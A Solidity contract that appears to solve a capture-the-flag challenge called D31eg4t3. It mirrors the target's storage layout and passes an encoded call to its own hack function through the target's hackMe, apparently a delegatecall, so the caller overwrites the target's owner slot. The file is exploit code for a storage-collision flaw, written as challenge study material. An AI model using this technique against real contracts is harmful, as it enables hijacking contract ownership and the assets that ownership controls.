// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3{
    function hackMe(bytes calldata bites) external returns(bool, bytes memory);
}

contract AttackD31eg4t3{


    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    function attackHackMe(address _D31eg4t3) external {
        bytes memory bites =  abi.encodeWithSignature("hack(address)", msg.sender);
        (bool r, ) = ID31eg4t3(_D31eg4t3).hackMe(bites);
        require(r, "Attack successfull");
    }
    
    function hack(address _attacker) external {
        owner = _attacker;
        canYouHackMe[_attacker] = true;
    }
}
